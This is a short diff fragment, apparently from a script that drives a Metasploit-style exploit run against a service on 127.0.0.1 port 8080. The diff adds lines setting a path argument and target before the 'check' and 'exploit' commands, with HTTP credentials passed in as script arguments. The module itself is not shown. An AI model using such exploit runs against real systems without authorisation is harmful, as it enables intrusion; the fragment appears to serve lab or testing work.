@@ -6,6 +6,8 @@ set RHOST 127.0.0.1;
 set RPORT 8080;
 set HttpUsername $1;
 set HttpPassword $2;
+set PATH $3;
+set target 1;
 check;
 exploit;
 exit"
